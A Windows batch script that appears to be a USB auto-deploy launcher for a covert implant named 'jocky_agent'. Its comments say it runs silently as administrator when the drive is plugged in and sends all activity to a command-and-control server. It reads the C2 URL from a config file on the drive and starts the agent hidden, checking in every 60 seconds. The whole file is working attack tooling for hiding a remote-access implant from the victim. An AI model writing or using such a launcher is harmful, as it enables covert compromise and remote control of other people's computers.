@echo off
REM JOCKY USB Auto-Deploy Launcher
REM Runs silently as Admin when USB is plugged in.
REM No output on target screen -- all activity goes to C2.

cd /d "%~dp0"

REM check if already running
tasklist /FI "IMAGENAME eq jocky_agent.exe" 2>NUL | find /I "jocky_agent.exe" >NUL
if "%ERRORLEVEL%"=="0" goto :already_running

REM read C2 config from usb
set /p C2_URL=<c2_config.txt

REM launch agent silently (hidden window, no console)
start "" /B /MIN "%~dp0jocky_agent.exe" --c2 %C2_URL% --interval 60 --usb-deploy

:already_running
exit /b 0